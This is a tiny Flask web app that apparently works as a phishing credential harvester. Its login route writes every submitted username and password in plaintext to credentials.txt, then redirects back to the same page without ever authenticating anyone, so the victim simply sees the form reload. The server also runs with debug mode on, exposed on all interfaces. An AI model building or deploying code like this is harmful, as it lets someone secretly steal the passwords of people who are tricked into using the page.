from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        
        with open("credentials.txt", "a") as f:
            f.write(f"{username} | {password}\n")
        
        return redirect("/")  # Reload the page

    return render_template("index.html")

if __name__ == "__main__":
    if not os.path.exists("credentials.txt"):
        open("credentials.txt", "w").close()

    app.run(host='0.0.0.0', port=5000, debug=True)



